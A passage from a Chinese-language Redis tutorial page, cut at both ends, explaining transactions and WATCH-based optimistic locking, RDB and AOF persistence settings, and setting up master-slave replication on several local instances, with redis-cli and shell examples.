<li>&#x5C5E;&#x6027;&#x4E8C; =&gt; Redis6 &#x4E4B;&#x524D;&#x7684;&#x547D;&#x4EE4;&#x64CD;&#x4F5C;&#x662F;&#x539F;&#x5B50;&#x6027;&#x7684;&#xFF0C;&#x56E0;&#x4E3A;&#x64CD;&#x4F5C;&#x662F;&#x5355;&#x7EBF;&#x7A0B;&#x7684;&#x3002;&#x539F;&#x5B50;&#x6027;&#x610F;&#x5473;&#x7740;&#x8981;&#x4E48;&#x6240;&#x6709;&#x547D;&#x4EE4;&#x90FD;&#x88AB;&#x5904;&#x7406;&#xFF0C;&#x8981;&#x4E48;&#x4E0D;&#x88AB;&#x5904;&#x7406;&#x3002;&#x82E5;&#x6709;&#x591A;&#x6761;&#x547D;&#x4EE4;&#x5E76;&#x53D1;&#x6267;&#x884C;&#xFF0C;&#x90A3;&#x4E48;&#x5C31;&#x4E0D;&#x4E00;&#x5B9A;&#x662F;&#x539F;&#x5B50;&#x6027;&#x7684;&#x3002;</li>
</ul>
</blockquote>
<p>Redis &#x4E8B;&#x52A1;&#x7531;&#x547D;&#x4EE4; <code>MULTI</code> &#x53D1;&#x8D77;&#xFF0C;&#x7136;&#x540E;&#x9700;&#x4F20;&#x9012;&#x5E94;&#x5728;&#x4E8B;&#x52A1;&#x4E2D;&#x6267;&#x884C;&#x7684;&#x547D;&#x4EE4;&#x5217;&#x8868;&#xFF0C;&#x4E4B;&#x540E;&#x6574;&#x4E2A;&#x4E8B;&#x52A1;&#x7531; <code>EXEC</code> &#x6267;&#x884C;&#x3002;&#x5728;&#x7EC4;&#x961F;&#x7684;&#x8FC7;&#x7A0B;&#x4E2D;&#x53EF;&#x4EE5;&#x901A;&#x8FC7; <code>DISCARD</code> &#x6765;&#x653E;&#x5F03;&#x7EC4;&#x961F;&#x3002;</p>
<pre><code class="language-shell">127.0.0.1:6379&gt; multi
OK
127.0.0.1:6379(TX)&gt; set k1 v1
QUEUED
127.0.0.1:6379(TX)&gt; set k2 v2
QUEUED
127.0.0.1:6379(TX)&gt; exec
1) OK
2) OK
127.0.0.1:6379&gt; multi
OK
127.0.0.1:6379(TX)&gt; set key1 value1
QUEUED
127.0.0.1:6379(TX)&gt; set key2 value2
QUEUED
127.0.0.1:6379(TX)&gt; discard
OK
</code></pre>
<h3 id="%E4%BA%8B%E5%8A%A1%E9%94%99%E8%AF%AF%E5%A4%84%E7%90%86">&#x4E8B;&#x52A1;&#x9519;&#x8BEF;&#x5904;&#x7406;</h3>
<ul>
<li>&#x82E5;&#x7EC4;&#x961F;&#x4E2D;&#x67D0;&#x547D;&#x4EE4;&#x51FA;&#x73B0;&#x9519;&#x8BEF;&#xFF0C;&#x6267;&#x884C;&#x65F6;&#x6574;&#x4E2A;&#x961F;&#x5217;&#x90FD;&#x4F1A;&#x88AB;&#x53D6;&#x6D88;&#x3002;</li>
<li>&#x82E5;&#x6267;&#x884C;&#x9636;&#x6BB5;&#x67D0;&#x547D;&#x4EE4;&#x51FA;&#x73B0;&#x9519;&#x8BEF;&#xFF0C;&#x5219;&#x53EA;&#x6709;&#x62A5;&#x9519;&#x7684;&#x547D;&#x4EE4;&#x4E0D;&#x4F1A;&#x88AB;&#x6267;&#x884C;&#xFF0C;&#x5176;&#x4ED6;&#x547D;&#x4EE4;&#x7EE7;&#x7EED;&#x6267;&#x884C;&#xFF0C;&#x4E0D;&#x4F1A;&#x56DE;&#x6EDA;&#x3002;</li>
</ul>
<h3 id="%E4%BA%8B%E5%8A%A1%E5%86%B2%E7%AA%81">&#x4E8B;&#x52A1;&#x51B2;&#x7A81;</h3>
<ul>
<li>&#x60B2;&#x89C2;&#x9501; Pessimistic Lock</li>
</ul>
<p>&#x60B2;&#x89C2;&#x9501;&#x5BF9;&#x6570;&#x636E;&#x662F;&#x5426;&#x88AB;&#x5916;&#x754C;&#x4FEE;&#x6539;&#x6301;&#x4FDD;&#x5B88;&#x6001;&#x5EA6;&#xFF0C;&#x56E0;&#x6B64;&#x5728;&#x6574;&#x4E2A;&#x6570;&#x636E;&#x5904;&#x7406;&#x8FC7;&#x7A0B;&#x4E2D;&#xFF0C;&#x5C06;&#x6570;&#x636E;&#x5904;&#x4E8E;&#x9501;&#x5B9A;&#x72B6;&#x6001;&#x3002;&#x4F20;&#x7EDF;&#x7684;&#x5173;&#x7CFB;&#x578B;&#x6570;&#x636E;&#x5E93;&#x91CC;&#x7528;&#x5230;&#x4E86;&#x5F88;&#x591A;&#x8FD9;&#x79CD;&#x9501;&#x673A;&#x5236;&#xFF0C;&#x6BD4;&#x5982;&#x884C;&#x9501;&#x3001;&#x8868;&#x9501;&#x3001;&#x8BFB;&#x9501;&#xFF0C;&#x5199;&#x9501;&#x7B49;&#xFF0C;&#x90FD;&#x662F;&#x5728;&#x505A;&#x64CD;&#x4F5C;&#x4E4B;&#x524D;&#x5148;&#x4E0A;&#x9501;&#x3002;</p>
<ul>
<li>&#x4E50;&#x89C2;&#x9501; Optimistic Lock =&gt; &#x62A2;&#x7EA2;&#x5305; &#x6DD8;&#x5B9D;&#x62A2;&#x8D2D; &#x79D2;&#x6740;</li>
</ul>
<p>&#x4E50;&#x89C2;&#x9501;&#x4F1A;&#x5047;&#x8BBE;&#x6570;&#x636E;&#x4E00;&#x822C;&#x60C5;&#x51B5;&#x4E0B;&#x4E0D;&#x4F1A;&#x56E0;&#x4FEE;&#x6539;&#x800C;&#x9020;&#x6210;&#x51B2;&#x7A81;&#xFF0C;&#x53EA;&#x5728;&#x6570;&#x636E;&#x8FDB;&#x884C;&#x63D0;&#x4EA4;&#x66F4;&#x65B0;&#x65F6;&#x624D;&#x4F1A;&#x6B63;&#x5F0F;&#x5BF9;&#x6570;&#x636E;&#x7684;&#x51B2;&#x7A81;&#x4E0E;&#x5426;&#x8FDB;&#x884C;&#x7248;&#x672C;&#x53F7;&#x68C0;&#x6D4B;&#x3002;&#x4E50;&#x89C2;&#x9501;&#x5229;&#x7528; Check-and-Set &#x673A;&#x5236;&#x5B9E;&#x73B0;&#x4E8B;&#x52A1;&#xFF0C;&#x9002;&#x7528;&#x4E8E;&#x591A;&#x8BFB;&#x7684;&#x5E94;&#x7528;&#x7C7B;&#x578B;&#x4EE5;&#x63D0;&#x9AD8;&#x541E;&#x5410;&#x91CF;&#x3002;</p>
<p><code>WATCH</code> &#x53EF;&#x76D1;&#x89C6;&#x6307;&#x5B9A;&#x952E;&#xFF0C;&#x5728;&#x4E8B;&#x52A1;&#x6267;&#x884C;&#x524D;&#x6307;&#x5B9A;&#x952E;&#x88AB;&#x5176;&#x4ED6;&#x547D;&#x4EE4;&#x6539;&#x52A8;&#xFF0C;&#x90A3;&#x4E48;&#x4E8B;&#x52A1;&#x6267;&#x884C;&#x5C06;&#x88AB;&#x6253;&#x65AD;&#x5E76;&#x901A;&#x77E5;&#x4E8B;&#x52A1;&#x5931;&#x8D25;&#x3002;<code>UNWATCH</code> &#x53EF;&#x53D6;&#x6D88; <code>WATCH</code> &#x547D;&#x4EE4;&#x5BF9;&#x6307;&#x5B9A;&#x952E;&#x7684;&#x76D1;&#x89C6;&#x3002;</p>
<pre><code class="language-shell"># window1
127.0.0.1:6379&gt; set balance 100
OK
127.0.0.1:6379&gt; watch balance
OK
127.0.0.1:6379&gt; multi
OK
127.0.0.1:6379(TX)&gt; incrby balance 20
QUEUED
127.0.0.1:6379(TX)&gt; exec
(nil)
127.0.0.1:6379&gt; get balance
&quot;110&quot;
# window2
127.0.0.1:6379&gt; keys *
1) &quot;balance&quot;
127.0.0.1:6379&gt; watch balance
OK
127.0.0.1:6379&gt; multi
OK
127.0.0.1:6379(TX)&gt; incrby balance 10
QUEUED
127.0.0.1:6379(TX)&gt; exec
1) (integer) 110
</code></pre>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="redis-%E6%8C%81%E4%B9%85%E5%8C%96">Redis &#x6301;&#x4E45;&#x5316;</h2>
<p>AOF &#x8868;&#x793A;&#x9644;&#x52A0;&#x6587;&#x4EF6;&#xFF0C;&#x662F;&#x66F4;&#x6539;&#x65E5;&#x5FD7;&#x6837;&#x5F0F;&#x7684;&#x6301;&#x4E45;&#x5316;&#x3002;RDB &#x7528;&#x4E8E; Redis &#x6570;&#x636E;&#x5E93;&#x6587;&#x4EF6;&#xFF0C;&#x662F;&#x5FEB;&#x7167;&#x98CE;&#x683C;&#x7684;&#x6301;&#x4E45;&#x5316;&#x3002;</p>
<h3 id="rdb-redis-database">RDB Redis DataBase</h3>
<p>&#x4EE5;&#x6307;&#x5B9A;&#x7684;&#x65F6;&#x95F4;&#x95F4;&#x9694;&#x5C06;&#x5185;&#x5B58;&#x4E2D;&#x7684;&#x6570;&#x636E;&#x96C6;&#x5FEB;&#x7167;&#x5199;&#x5165;&#x78C1;&#x76D8;&#xFF0C;&#x5373; SnapShot &#x5FEB;&#x7167;&#xFF0C;&#x5176;&#x6062;&#x590D;&#x65F6;&#x662F;&#x5C06;&#x5FEB;&#x7167;&#x6587;&#x4EF6;&#x76F4;&#x63A5;&#x8BFB;&#x5230;&#x5185;&#x5B58;&#x91CC;&#x3002;&#x5185;&#x5B58;&#x6301;&#x4E45;&#x5316;&#x540E;&#x5728;&#x542F;&#x52A8;&#x8DEF;&#x5F84;&#x751F;&#x6210;&#x6587;&#x4EF6; dump.rdb&#x3002;&#x540C;&#x6B65;&#x4E4B;&#x524D;&#x4F1A;&#x5148;&#x5EFA;&#x7ACB;&#x4E34;&#x65F6;&#x6587;&#x4EF6;&#x5E76;&#x653E;&#x5165;&#x6570;&#x636E;&#xFF0C;&#x6B64;&#x540E;&#x624D;&#x66FF;&#x6362;&#x4E3B;&#x8981;&#x5185;&#x5BB9;&#x3002;</p>
<p>&#x6CE8;&#x610F;&#x5F53;&#x672A;&#x6301;&#x4E45;&#x5316;&#x7684;&#x6700;&#x65B0;&#x4E00;&#x6B21;&#x65F6;&#x95F4;&#x95F4;&#x9694;&#x5185;&#xFF0C;&#x82E5;&#x5BF9;&#x6570;&#x636E;&#x8FDB;&#x884C;&#x64CD;&#x4F5C;&#x7684;&#x540C;&#x65F6;&#x670D;&#x52A1;&#x5668;&#x5B95;&#x673A;&#xFF0C;&#x90A3;&#x4E48;&#x4F1A;&#x9020;&#x6210;&#x6570;&#x636E;&#x4E22;&#x5931;&#x3002;</p>
<ul>
<li>RDB &#x6301;&#x4E45;&#x5316;&#x6D41;&#x7A0B; =&gt; &#x5355;&#x72EC; fork &#x4E00;&#x4E2A;&#x5B50;&#x8FDB;&#x7A0B;&#x8FDB;&#x884C;&#x6301;&#x4E45;&#x5316;</li>
</ul>
<p>&#x9996;&#x5148;&#x5C06;&#x6570;&#x636E;&#x5199;&#x5165;&#x4E00;&#x4E2A;&#x4E34;&#x65F6;&#x6587;&#x4EF6;&#xFF0C;&#x5F85;&#x6301;&#x4E45;&#x5316;&#x8FC7;&#x7A0B;&#x7ED3;&#x675F;&#x518D;&#x7528;&#x8FD9;&#x4E2A;&#x4E34;&#x65F6;&#x6587;&#x4EF6;&#x66FF;&#x6362;&#x6389;&#x4E0A;&#x6B21;&#x6301;&#x4E45;&#x5316;&#x7684;&#x6587;&#x4EF6;&#x3002;&#x5728;&#x6B64;&#x8FC7;&#x7A0B;&#x4E2D;&#xFF0C;&#x4E3B;&#x8FDB;&#x7A0B;&#x4E0D;&#x8FDB;&#x884C;&#x4EFB;&#x4F55;&#x7684; IO &#x64CD;&#x4F5C;&#x3002;</p>
<p>&#x5982;&#x9700;&#x5927;&#x89C4;&#x6A21;&#x6570;&#x636E;&#x6062;&#x590D;&#xFF0C;&#x4E14;&#x5BF9;&#x6570;&#x636E;&#x6062;&#x590D;&#x7684;&#x5B8C;&#x6574;&#x6027;&#x4E0D;&#x654F;&#x611F;&#xFF0C;&#x90A3;&#x4E48; rdb &#x4F1A;&#x6BD4; aof &#x65B9;&#x5F0F;&#x66F4;&#x52A0;&#x9AD8;&#x6548;&#x3002;&#x5176;&#x7F3A;&#x70B9;&#x5C31;&#x662F;&#x6700;&#x540E;&#x4E00;&#x6B21;&#x6301;&#x4E45;&#x5316;&#x7684;&#x6570;&#x636E;&#x53EF;&#x80FD;&#x4E22;&#x5931;&#x3002;</p>
<blockquote>
<p>Fork<br>
In an operating system, a fork is a Unix or Linux system call to create a new process from an existing running process. The new process is a child process of the calling parent process.</p>
</blockquote>
<ul>
<li>SNAPSHOTTING</li>
</ul>
<p>stop-writes-on-bgsave-error =&gt; &#x65E0;&#x6CD5;&#x5199;&#x5165;&#x78C1;&#x76D8;&#x7684;&#x65F6;&#x5019;&#xFF08;&#x78C1;&#x76D8;&#x7A7A;&#x95F4;&#x6EE1;&#x4E86;&#xFF09;&#xFF0C;&#x4E0D;&#x518D;&#x8FDB;&#x884C; redis &#x7684;&#x5199;&#x64CD;&#x4F5C;&#x3002;</p>
<blockquote>
<p>BGSAVE =&gt;<br>
Redis BGSAVE command saves the DB in the background. The OK code is immediately returned. Redis forks, the parent continues to serve the clients, the child saves the DB on the disk, then exits. A client may be able to check if the operation succeeded using the LASTSAVE command.</p>
</blockquote>
<p>rdbcompression =&gt; &#x662F;&#x5426;&#x5BF9;&#x6301;&#x4E45;&#x5316;&#x7684;&#x6587;&#x4EF6;&#x8FDB;&#x884C;&#x538B;&#x7F29;&#x3002;yes &#x5219;&#x91C7;&#x7528; LZF &#x7B97;&#x6CD5;&#x538B;&#x7F29;&#x3002;</p>
<p>rdbchecksum =&gt; &#x5B58;&#x50A8;&#x5FEB;&#x7167;&#x540E;&#x4EE5; CRC64 Cyclic redundancy check &#x8FDB;&#x884C;&#x6570;&#x636E;&#x6821;&#x9A8C;&#x3002;</p>
<p>save =&gt; &#x8BBE;&#x7F6E;&#x67D0;&#x6BB5;&#x65F6;&#x95F4;&#x5185;&#x5B58;&#x5728;&#x591A;&#x5C11;&#x53D8;&#x5316;&#x5C31;&#x4F1A;&#x8FDB;&#x884C;&#x6301;&#x4E45;&#x5316;&#x64CD;&#x4F5C;&#x3002;</p>
<h3 id="aof-append-of-file">AOF Append Of File</h3>
<p>&#x4EE5;&#x65E5;&#x5FD7;&#x7684;&#x5F62;&#x5F0F;&#x8BB0;&#x5F55;&#x5199;&#x64CD;&#x4F5C;&#xFF08;&#x589E;&#x91CF;&#x4FDD;&#x5B58;&#xFF09;&#xFF0C;&#x5C06;&#x6267;&#x884C;&#x8FC7;&#x7684;&#x6240;&#x6709;&#x5199;&#x6307;&#x4EE4;&#x4FDD;&#x5B58;&#xFF0C;&#x53EA;&#x8BB8;&#x8FFD;&#x52A0;&#x4F46;&#x4E0D;&#x53EF;&#x4EE5;&#x6539;&#x5199;&#x6587;&#x4EF6;&#xFF0C;redis &#x542F;&#x52A8;&#x65F6;&#x4F1A;&#x8BFB;&#x53D6;&#x8BE5;&#x6587;&#x4EF6;&#x5E76;&#x6267;&#x884C;&#x4EE5;&#x91CD;&#x6784;&#x6062;&#x590D;&#x6570;&#x636E;&#x3002;</p>
<ul>
<li>AOF &#x6301;&#x4E45;&#x5316;&#x6D41;&#x7A0B;</li>
</ul>
<p>AOF &#x9ED8;&#x8BA4;&#x4E0D;&#x5F00;&#x542F;&#xFF0C;&#x9700;&#x5728;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x8BBE;&#x7F6E; appendonly &#x4E3A; yes&#x3002;&#x5176;&#x6587;&#x4EF6;&#x4FDD;&#x5B58;&#x8DEF;&#x5F84;&#x4E0E; RDB &#x4E00;&#x81F4;&#x3002;&#x5F53; AOF &#x4E0E; RDB &#x540C;&#x65F6;&#x5F00;&#x542F;&#xFF0C;&#x7CFB;&#x7EDF;&#x4F1A;&#x9ED8;&#x8BA4;&#x8BFB;&#x53D6;&#x524D;&#x8005;&#x6570;&#x636E;&#xFF08;&#x5B8C;&#x6574;&#x6027;&#xFF09;&#x3002;</p>
<ul>
<li>APPEND ONLY MODE</li>
</ul>
<p>appendonly no =&gt; &#x662F;&#x5426;&#x5728;&#x6BCF;&#x6B21;&#x66F4;&#x65B0;&#x64CD;&#x4F5C;&#x540E;&#x8FDB;&#x884C;&#x65E5;&#x5FD7;&#x8BB0;&#x5F55;&#x3002;</p>
<p>appendfilename appendonly.aof =&gt; &#x6307;&#x5B9A;&#x66F4;&#x65B0;&#x65E5;&#x5FD7;&#x6587;&#x4EF6;&#x540D;&#x3002;</p>
<p>appendfsync =&gt; &#x66F4;&#x65B0;&#x65E5;&#x5FD7;&#x6761;&#x4EF6;|&#x540C;&#x6B65;&#x9891;&#x7387;&#x8BBE;&#x7F6E; -&gt; no|fsync|everysec&#x3002;</p>
<ul>
<li>&#x5F02;&#x5E38;&#x6062;&#x590D;</li>
</ul>
<pre><code class="language-shell">/usr/local/bin/redis-check-aof--fix appendonly.aof
</code></pre>
<ul>
<li><a href="https://redis.io/commands/bgrewriteaof/">BGREWRITEAOF</a></li>
</ul>
<p>&#x542F;&#x52A8;&#x91CD;&#x5199;&#x5C06;&#x521B;&#x5EFA;&#x5F53;&#x524D;&#x4EC5;&#x9644;&#x52A0;&#x6587;&#x4EF6;&#x7684;&#x5C0F;&#x578B;&#x4F18;&#x5316;&#x7248;&#x672C;&#x3002;&#x4ECE; Redis 2.4 &#x5F00;&#x59CB;&#xFF0C;AOF &#x91CD;&#x5199;&#x7531; Redis &#x81EA;&#x52A8;&#x89E6;&#x53D1;&#xFF0C;&#x4F46;&#x662F;&#x8BE5; BGREWRITEAOF &#x547D;&#x4EE4;&#x53EF;&#x7528;&#x4E8E;&#x968F;&#x65F6;&#x89E6;&#x53D1;&#x91CD;&#x5199;&#x3002;</p>
<p>no-appendfsync-on-rewrite=yes =&gt; &#x4E0D;&#x5199;&#x5165; aof &#x6587;&#x4EF6;&#x53EA;&#x5199;&#x5165;&#x7F13;&#x5B58;&#x3002;</p>
<p>auto-aof-rewrite-percentage =&gt; &#x8BBE;&#x7F6E;&#x91CD;&#x5199;&#x7684;&#x57FA;&#x51C6;&#x503C;&#xFF0C;&#x6587;&#x4EF6;&#x8FBE;&#x5230; 100% &#x65F6;&#x91CD;&#x5199;&#x3002;</p>
<p>auto-aof-rewrite-min-size =&gt; &#x8BBE;&#x7F6E;&#x91CD;&#x5199;&#x7684;&#x57FA;&#x51C6;&#x503C;&#xFF0C;&#x6587;&#x4EF6;&#x8FBE;&#x5230; 64MB &#x5F00;&#x59CB;&#x91CD;&#x5199;&#x3002;</p>
<p>AOF &#x5F53;&#x524D;&#x5927;&#x5C0F; &gt;= base_size + base_size*100% &#x4E14; &gt;= 64mb &#x7684;&#x60C5;&#x51B5;&#x4E0B;&#x5F00;&#x542F;&#x91CD;&#x5199;&#x3002;</p>
<h3 id="%E5%B0%8F%E7%BB%93%E6%AF%94%E8%BE%83">&#x5C0F;&#x7ED3;&#x6BD4;&#x8F83;</h3>
<p>&#x63A8;&#x8350;&#x4E24;&#x4E2A;&#x90FD;&#x542F;&#x7528;&#x3002;&#x82E5;&#x5BF9;&#x6570;&#x636E;&#x4E0D;&#x654F;&#x611F;&#xFF0C;&#x53EF;&#x5355;&#x72EC;&#x7528; RDB&#xFF0C;&#x4F46;&#x4E0D;&#x5EFA;&#x8BAE;&#x5355;&#x72EC;&#x7528; AOF&#x3002;&#x5982;&#x679C;&#x53EA;&#x662F;&#x505A;&#x7EAF;&#x5185;&#x5B58;&#x7F13;&#x5B58;&#xFF0C;&#x53EF;&#x4EE5;&#x90FD;&#x4E0D;&#x7528;&#x3002;</p>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6">&#x4E3B;&#x4ECE;&#x590D;&#x5236;</h2>
<p>&#x4E3B;&#x4ECE;&#x590D;&#x5236;&#x5373;&#x4E3B;&#x673A;&#x6570;&#x636E;&#x66F4;&#x65B0;&#x540E;&#x6839;&#x636E;&#x914D;&#x7F6E;&#x548C;&#x7B56;&#x7565;&#xFF0C;&#x81EA;&#x52A8;&#x540C;&#x6B65;&#x5230;&#x4ECE;&#x673A;&#x7684; Master/Slaver &#x673A;&#x5236;&#x3002;Master &#x4EE5;&#x5199;&#x4E3A;&#x4E3B;&#xFF0C;Slave &#x4EE5;&#x8BFB;&#x4E3A;&#x4E3B;&#x3002;&#x901A;&#x8FC7;&#x8BFB;&#x5199;&#x5206;&#x79BB;&#x63D0;&#x9AD8;&#x6027;&#x80FD;&#x7684;&#x6269;&#x5C55;&#x4EE5;&#x53CA;&#x5BB9;&#x707E;&#x7684;&#x5FEB;&#x901F;&#x6062;&#x590D;&#x3002;</p>
<h3 id="%E5%BF%AB%E9%80%9F%E9%85%8D%E7%BD%AE">&#x5FEB;&#x901F;&#x914D;&#x7F6E;</h3>
<p>&#x4E3A;&#x542F;&#x52A8;&#x591A;&#x4E2A; redis &#x670D;&#x52A1;&#xFF0C;&#x5C06; redis.conf duplicator &#x5728;&#x4FEE;&#x6539;&#x914D;&#x7F6E;&#x540E;&#x653E;&#x5165;&#x65B0;&#x5EFA; myredis &#x76EE;&#x5F55;&#xFF0C;&#x7528;&#x4E8E;&#x5E26;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x7684;&#x542F;&#x52A8;&#x3002;daemonize &#x5E94;&#x91C7;&#x7528; yes &#x4EE5;&#x4FDD;&#x8BC1; redis &#x5728;&#x540E;&#x53F0;&#x8FD0;&#x884C;&#x3002;</p>
<ul>
<li>&#x901A;&#x7528;&#x914D;&#x7F6E;</li>
</ul>
<pre><code class="language-shell">[centos ~]# /usr/local/bin/redis-server /etc/redis.conf
[centos ~]# mkdir /myredis &amp;&amp; cd /myredis
[centos myredis]# cp /etc/redis.conf /myredis/redis.conf
[centos myredis]# ls
redis.conf
</code></pre>
<pre><code class="language-shell"># /myredis/redis.conf
...
appendonly no # &#x662F;&#x5426;&#x5728;&#x6BCF;&#x6B21;&#x66F4;&#x65B0;&#x64CD;&#x4F5C;&#x540E;&#x8FDB;&#x884C;&#x65E5;&#x5FD7;&#x8BB0;&#x5F55; =&gt; &#x9ED8;&#x8BA4;&#x60C5;&#x51B5;&#x4E0B;&#x662F;&#x5F02;&#x6B65;&#x7684;&#x628A;&#x6570;&#x636E;&#x5199;&#x5165;&#x78C1;&#x76D8;
</code></pre>
<ul>
<li>redis63Xx.conf &#x72EC;&#x7ACB;&#x914D;&#x7F6E;</li>
</ul>
<pre><code class="language-shell"># redis63XX.conf
include /myredis/redis.conf # &#x7EDD;&#x5BF9;&#x8DEF;&#x5F84;
pidfile /var/run/redis_6379.pid # redis &#x4EE5;&#x5B88;&#x62A4;&#x8FDB;&#x7A0B;&#x65B9;&#x5F0F;&#x8FD0;&#x884C;&#x65F6;&#x9ED8;&#x8BA4;&#x628A; pid &#x5199;&#x5165; /var/run/redis[???].pid &#x6587;&#x4EF6;
port 6379
dbfilename dump6379.rdb # &#x4E00;&#x6BB5;&#x65F6;&#x95F4;&#x81EA;&#x52A8;&#x5BF9;&#x6570;&#x636E;&#x5E93;&#x904D;&#x5386;&#x5E76;&#x5C06;&#x5185;&#x5B58;&#x5FEB;&#x7167;&#x5199;&#x5165; dump.rdb
</code></pre>
<ul>
<li>&#x8FD0;&#x884C;&#x60C5;&#x51B5;&#x67E5;&#x770B;</li>
</ul>
<pre><code class="language-shell">[centos myredis]# redis-server redis6379.conf
[centos myredis]# redis-server redis6380.conf
[centos myredis]# redis-server redis6381.conf
[centos myredis]# ps -ef | grep redis
root     15665     1  0 Jun16 ?        00:01:19 redis-server *:6379
root     25595     1  0 21:24 ?        00:00:00 redis-server *:6380
root     25606     1  0 21:24 ?        00:00:00 redis-server *:6381
root     25706 21513  0 21:25 pts/0    00:00:00 grep --color=auto redis
[centos myredis]# kill -9 15665 25595 25606
</code></pre>
<ul>
<li>&#x65B0;&#x7EC8;&#x7AEF;&#x8FDE;&#x63A5;</li>
</ul>
<pre><code class="language-shell">[centos myredis]# redis-cli -p 6379
[centos myredis]# redis-cli -p 6380
[centos myredis]# redis-cli -p 6381
[centos myredis]# info replication # &#x67E5;&#x770B;&#x590D;&#x5236;&#x5B9E;&#x4F8B;&#x4FE1;&#x606F;
# Replication
role:master
connected_slaves:0
...
</code></pre>
<h3 id="%E4%B8%80%E4%B8%BB%E4%BA%8C%E4%BB%86">&#x4E00;&#x4E3B;&#x4E8C;&#x4EC6;</h3>
<p>&#x4ECE;&#x670D;&#x52A1;&#x5668;&#x5B95;&#x673A;&#x540E;&#x91CD;&#x542F;&#xFF0C;&#x90A3;&#x4E48;&#x8FD9;&#x4E2A;&#x670D;&#x52A1;&#x5668;&#x4E0D;&#x518D;&#x4F5C;&#x4E3A;&#x4E3B;&#x4ECE;&#x4E2D;&#x7684;&#x4ECE;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x800C;&#x662F;&#x72EC;&#x7ACB;&#x4E8E;&#x539F;&#x4E3B;&#x670D;&#x52A1;&#x5668;&#x7684;&#x4E3B;&#x670D;&#x52A1;&#x5668;&#x3002;&#x4E3B;&#x670D;&#x52A1;&#x5668;&#x5B95;&#x673A;&#x540E;&#x4ECE;&#x670D;&#x52A1;&#x5668;&#x4ECD;&#x7B49;&#x5F85;&#x4E3B;&#x673A;&#xFF0C;&#x5F85;&#x4E3B;&#x670D;&#x52A1;&#x5668;&#x6062;&#x590D;&#x540E;&#x8FD8;&#x662F;&#x4E3B;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x6570;&#x636E;&#x4F9D;&#x65E7;&#x3002;&#x5F53;&#x4ECE;&#x670D;&#x52A1;&#x5668;&#x8FDE;&#x63A5;&#x4E3B;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x4ECE;&#x670D;&#x52A1;&#x5668;&#x4F1A;&#x5411;&#x4E3B;&#x670D;&#x52A1;&#x5668;&#x53D1;&#x9001;&#x6570;&#x636E;&#x540C;&#x6B65;&#x7684;&#x6D88;&#x606F;&#x3002;&#x4E3B;&#x670D;&#x52A1;&#x5668;&#x63A5;&#x5230;&#x540C;&#x6B65;&#x6D88;&#x606F;&#x540E;&#xFF0C;&#x4F1A;&#x5C06;&#x4E3B;&#x670D;&#x52A1;&#x5668;&#x6570;&#x636E;&#x8FDB;&#x884C;&#x6301;&#x4E45;&#x5316;&#x64CD;&#x4F5C;&#xFF0C;&#x5E76;&#x5C06;&#x4EA7;&#x751F;&#x7684; dump.rdb &#x6587;&#x4EF6;&#x53D1;&#x9001;&#x7ED9;&#x4ECE;&#x670D;&#x52A1;&#x5668;&#x8BFB;&#x53D6;&#x3002;&#x6BCF;&#x6B21;&#x4E3B;&#x670D;&#x52A1;&#x5668;&#x8FDB;&#x884C;&#x5199;&#x64CD;&#x4F5C;&#x540E;&#xFF0C;&#x90FD;&#x4F1A;&#x548C;&#x4ECE;&#x670D;&#x52A1;&#x5668;&#x8FDB;&#x884C;&#x6570;&#x636E;&#x540C;&#x6B65;&#x3002;</p>
<ul>
<li>&#x5728;&#x4ECE;&#x673A;&#x4E0A;&#x6267;&#x884C; slaveof &#x547D;&#x4EE4;&#xFF0C;&#x8BBE;&#x7F6E;&#x5176;&#x4E3A;&#x6307;&#x5B9A;&#x4E3B;&#x673A;&#x7684;&#x4ECE;&#x673A;</li>
</ul>
<pre><code class="language-shell"># &#x8BBE;&#x7F6E;&#x4E3A;&#x6307;&#x5B9A;&#x4E3B;&#x673A;&#x7684;&#x4ECE;&#x673A; =&gt; slaveof &lt;ip&gt; &lt;port&gt;
127.0.0.1:63xx&gt;# slaveof 127.0.0.1 6379
OK
</code></pre>
<p>&#x7B80;&#x800C;&#x8A00;&#x4E4B;&#xFF0C;&#x4ECE;&#x670D;&#x52A1;&#x5668;&#x5B95;&#x673A;&#x540E;&#x91CD;&#x542F;&#x518D;&#x4F5C;&#x4E3A;&#x4E3B;&#x670D;&#x52A1;&#x5668;&#x7684;&#x4ECE;&#x673A;&#xFF0C;&#x90A3;&#x4E48;&#x8FD8;&#x662F;&#x4F1A;&#x62FF;&#x5230;&#x4E3B;&#x673A;&#x4E2D;&#x7684;&#x6240;&#x6709;&#x6570;&#x636E;&#xFF0C;&#x54EA;&#x6015;&#x5728;&#x5B95;&#x673A;&#x671F;&#x95F4;&#x4E3B;&#x673A;&#x8FDB;&#x884C;&#x4E86;&#x64CD;&#x4F5C;&#x3002;&#x4E3B;&#x670D;&#x52A1;&#x5668;&#x5B95;&#x673A;&#x540E;&#x4E0D;&#x4F1A;&#x88AB;&#x4ECE;&#x670D;&#x52A1;&#x5668;&#x593A;&#x53D6;&#x4E3B;&#x670D;&#x52A1;&#x5668;&#x7684;&#x4F4D;&#x7F6E;&#xFF0C;&#x4E14;&#x5728;&#x4E3B;&#x670D;&#x52A1;&#x5668;&#x6062;&#x590D;&#x540E;&#x6570;&#x636E;&#x4F9D;&#x65E7;&#x4FDD;&#x7559;&#x3002;</p>
<blockquote>
<ol>
<li>&#x4E3B;&#x673A;&#x4E0D;&#x914D;&#x7F6E;&#xFF0C;&#x4ECE;&#x673A;&#x4F7F;&#x7528; slaveof &#x6216; replicaof &#x58F0;&#x660E;&#x6240;&#x5C5E;&#x4E3B;&#x673A;&#x3002;</li>
